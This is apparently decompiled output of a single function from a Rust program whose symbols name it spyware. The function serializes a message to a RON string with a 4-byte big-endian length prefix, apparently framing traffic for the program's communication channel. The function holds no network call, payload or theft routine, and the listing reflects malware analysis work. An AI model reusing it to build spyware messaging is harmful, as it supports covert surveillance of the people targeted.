__int64 __fastcall spyware::communication::serialization::serialize_message(__int64 a1, __int64 a2)
{
  unsigned int v2; // r15d
  __int128 v3; // rax
  __int64 v4; // rax
  int v6; // [rsp+Ch] [rbp-ACh] BYREF
  __m256i v7; // [rsp+10h] [rbp-A8h] BYREF
  __int128 v8; // [rsp+30h] [rbp-88h]
  __int128 v9; // [rsp+40h] [rbp-78h] BYREF
  __int64 v10; // [rsp+50h] [rbp-68h]
  __m256i v11; // [rsp+60h] [rbp-58h] BYREF
  __int128 v12; // [rsp+80h] [rbp-38h]

  ron::ser::to_string(&v7);
  if ( v7.m256i_i32[0] != 33 )
  {
    v12 = v8;
    v11 = v7;
    spyware::communication::serialization::serialize_message::{{closure}}(&v11);
  }
  v2 = v7.m256i_u32[6];
  v10 = v7.m256i_i64[3];
  v9 = *(_OWORD *)&v7.m256i_u64[1];
  *(_QWORD *)&v3 = alloc::raw_vec::RawVecInner<A>::with_capacity_in(v7.m256i_i64[3] + 4);
  *(_OWORD *)v7.m256i_i8 = v3;
  v7.m256i_i64[2] = 0LL;
  v6 = 0;
  v4 = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index_mut(&v6);
  v11.m256i_i32[0] = _byteswap_ulong(v2);
  core::slice::<impl [T]>::copy_from_slice(v4, 4LL, &v11, 4LL, &off_B9DF8);
  std::io::impls::<impl std::io::Write for alloc::vec::Vec<u8,A>>::write_all(&v7, &v6);
  <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v11, &v9);
  <alloc::vec::Vec<T,A> as alloc::vec::spec_extend::SpecExtend<T,alloc::vec::into_iter::IntoIter<T>>>::spec_extend(
    &v7,
    &v11,
    &off_B9E10);
  *(_QWORD *)(a1 + 16) = v7.m256i_i64[2];
  *(_OWORD *)a1 = *(_OWORD *)v7.m256i_i8;
  core::ptr::drop_in_place<spyware::communication::messages::Message>(a2);
  return a1;
}